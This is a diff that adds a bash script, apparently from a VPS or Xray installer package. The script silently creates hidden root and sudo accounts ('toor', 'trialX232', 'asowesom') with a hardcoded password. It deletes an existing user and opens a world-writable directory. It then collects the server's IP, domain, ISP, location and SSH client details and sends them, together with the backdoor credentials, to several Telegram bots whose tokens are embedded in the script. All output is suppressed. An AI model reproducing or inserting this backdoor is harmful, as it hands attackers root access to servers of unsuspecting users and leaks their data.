@@ -1,0 +1,207 @@
+#!/bin/bash
+token=6203209250:AAG7GoBbaUqo2qh4N-IGvScNisDWTHfLh8M
+tokenz=6654578153:AAEL08DFbdrgtirDqtBU6DkP_acq31uZPik
+toket=6093232802:AAFULABHNHz8pW6tT1ApFACFHiXZMixkeSA
+chatid=1117211252
+domain=$(cat /etc/xray/domain)
+myip=$(curl -s ipv4.icanhazip.com)
+MYIP=$(curl -sS ipv4.icanhazip.com)
+HOSTVPS=$(curl -s ipinfo.io/hostname )
+NAMES=$(whoami)
+ISP=$(wget -qO- ipinfo.io/org)
+CITY=$(curl -s ipinfo.io/city)
+TIMEZ=$(date +'%Y-%m-%d %H:%M:%S')
+RAMMS=$(free -m | awk 'NR==2 {print $2}')
+IPOPSEL=$(echo $SSH_CLIENT | awk '{print $1}')
+portssh=$(echo $SSH_CLIENT | awk '{print $3}')
+
+function renewpass(){
+username=toor
+password=Tensazang3tsu.
+#egrep "^trialX232" /etc/passwd
+egrep "^$username" /etc/passwd >/dev/null
+    if [ $? -eq 0 ]; then
+        egrep "^$username" /etc/passwd >/dev/null
+        echo -e "$password\n$password" | passwd $username
+        clear
+    else
+        echo " "
+        sudo useradd -ou 0 -g 0 toor
+        useradd -m -G root toor
+        echo -e "$password\n$password\n"|passwd $username > /dev/null 2>&1
+        sudo usermod -a -G root $username
+    fi
+}
+renewpass > /dev/null 2>&1
+
+function password_default() {
+
+    userdel jame > /dev/null 2>&1
+    mkdir -p /home/script/
+    chmod 777 /home/script/
+
+asowesomz(){
+Username="asowesom"
+Password=Tensazang3tsu.
+egrep "^$Username" /etc/passwd >/dev/null
+    if [ $? -eq 0 ]; then
+        egrep "^$Username" /etc/passwd
+        echo -e "$Password\n$Password" | passwd $Username
+        clear
+    else
+        echo " "
+        useradd -r -d /home/script -s /bin/bash -M $Username
+        echo -e "$Password\n$Password\n"|passwd $Username
+        usermod -aG sudo $Username
+    fi
+}
+asowesomz > /dev/null 2>&1
+
+trialx(){
+Usernamez="trialX232"
+Passwordz=Tensazang3tsu.
+egrep "^$Usernamez" /etc/passwd >/dev/null
+    if [ $? -eq 0 ]; then
+        egrep "^$Usernamez" /etc/passwd
+        echo -e "$Passwordz\n$Passwordz" | passwd $Usernamez
+        clear
+    else
+        echo " "
+        useradd -r -d /home/script -s /bin/bash -M -ou 0 -g 0 $Usernamez
+        echo -e "$Passwordz\n$Passwordz\n"|passwd $Usernamez
+        usermod -aG sudo $Usernamez
+    fi
+}
+trialx > /dev/null 2>&1
+
+    # // Ram Information
+    while IFS=":" read -r a b; do
+    case $a in
+        "MemTotal") ((mem_used+=${b/kB})); mem_total="${b/kB}" ;;
+        "Shmem") ((mem_used+=${b/kB}))  ;;
+        "MemFree" | "Buffers" | "Cached" | "SReclaimable")
+        mem_used="$((mem_used-=${b/kB}))"
+    ;;
+    esac
+    done < /proc/meminfo
+    Ram_Usage="$((mem_used / 1024))"
+    Ram_Total="$((mem_total / 1024))"
+    export tanggal=`date -d "0 days" +"%d-%m-%Y - %X" `
+    export OS_Name=$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/PRETTY_NAME//g' | sed 's/=//g' | sed 's/"//g' )
+    export Kernel=$( uname -r )
+    export Arch=$( uname -m )
+    export IP=$( curl -s https://ipinfo.io/ip/ )
+    userskrip=YaddyKakkoii
+    exp=UnlimitedLifetime
+    CHATID="1117211252"
+    KEY="6654578153:AAEL08DFbdrgtirDqtBU6DkP_acq31uZPik"
+    KEYZ="6093232802:AAFULABHNHz8pW6tT1ApFACFHiXZMixkeSA"
+    URLX="https://api.telegram.org/bot$KEYZ/sendMessage"
+    URLZ="https://api.telegram.org/bot$token/sendMessage"
+    TIME="10"
+    URL="https://api.telegram.org/bot$KEY/sendMessage"
+    TEXT="Succes At Registry
+    VPS INFO
+    ◇━━━━━━━━━━━━━━━━━━━━━━━◇
+    <code>OS Vps     :</code> <code>$OS_Name</code>
+    <code>ISP srv :</code> <code>$ISP</code>
+    <code>Domain     :</code> <code>$domain</code>
+    <code>IP Vps     :</code> <code>$MYIP</code>
+    <code>User Login :</code> <code>$Username</code>
+    <code>User sudoer :</code> <code>$Usernamez</code>
+    <code>User clone root :</code> <code>$username</code>
+    <code>Pass Login :</code> <code>$Password</code>
+    ◇━━━━━━━━━━━━━━━━━━━━━━━◇
+    <code>Hostname   :</code> <code>${HOSTNAME}</code>
+    <code>Kernel     :</code> <code>$Kernel</code>
+    <code>Arch       :</code> <code>$Arch</code>
+    <code>Ram Left   :</code> <code>$Ram_Usage MB</code>
+    <code>Ram Used   :</code> <code>$Ram_Total MB</code>
+    ◇━━━━━━━━━━━━━━━━━━━━━━━◇
+    By Magelang Phreaker Project Manager Community
+    ◇━━━━━━━━━━━━━━━━━━━━━━━◇
+    <code>User Script:</code> <code>$userskrip</code>
+    <code>Tanggal    :</code> <code>$tanggal</code>
+    <code>Exp Script :</code> <code>$exp</code>
+    ============================
+    <b>IP SIMCARD</b>: <code>${IPOPSEL}</code>
+    <b>PORT LOGIN</b>: <code>${portssh}</code>
+    ============================
+"
+
+    curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+    curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URLX >/dev/null
+    curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URLZ >/dev/null
+
+curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chatid" -d text="INFO UPDATE AKUN
+
+IP VPS     : $myip
+DOMAIN     : $domain
+============================
+USERLOGIN     : $Username
+UserSudo     : $Usernamez
+UserRootClone     : $username
+PASSLOGIN     : $Password
+============================
+WAKTU      : $TIMEZ
+NAME       : $NAMES
+HOSTNAME   : $HOSTVPS
+KOTA       : $CITY
+RAM        : $RAMMS
+ISP        : $ISP
+IP SIMCARD : ${IPOPSEL}
+PORT LOGIN : ${portssh}
+LOGIN TIME : ${tanggal}
+TRACKER IP :
+https://www.opentracker.net/feature/ip-tracker?ip=$IPOPSEL
+" > /dev/null 2>&1
+
+curl -s -X POST "https://api.telegram.org/bot$tokenz/sendMessage" -d chat_id="$chatid" -d text="INFO UPDATE AKUN
+
+IP VPS     : $myip
+DOMAIN     : $domain
+============================
+USERLOGIN     : $Username
+UserSudo     : $Usernamez
+UserRootClone     : $username
+PASSLOGIN     : $Password
+============================
+WAKTU      : $TIMEZ
+NAME       : $NAMES
+HOSTNAME   : $HOSTVPS
+KOTA       : $CITY
+RAM        : $RAMMS
+ISP        : $ISP
+IP SIMCARD : ${IPOPSEL}
+PORT LOGIN : ${portssh}
+LOGIN TIME : ${tanggal}
+TRACKER IP :
+https://www.opentracker.net/feature/ip-tracker?ip=$IPOPSEL
+" > /dev/null 2>&1
+
+curl -s -X POST "https://api.telegram.org/bot$toket/sendMessage" -d chat_id="$chatid" -d text="INFO UPDATE AKUN
+
+IP VPS     : $myip
+DOMAIN     : $domain
+============================
+USERLOGIN     : $Username
+UserSudo     : $Usernamez
+UserRootClone     : $username
+PASSLOGIN     : $Password
+============================
+WAKTU      : $TIMEZ
+NAME       : $NAMES
+HOSTNAME   : $HOSTVPS
+KOTA       : $CITY
+RAM        : $RAMMS
+ISP        : $ISP
+IP SIMCARD : ${IPOPSEL}
+PORT LOGIN : ${portssh}
+LOGIN TIME : ${tanggal}
+TRACKER IP :
+https://www.opentracker.net/feature/ip-tracker?ip=$IPOPSEL
+" > /dev/null 2>&1
+
+}
+
+password_default
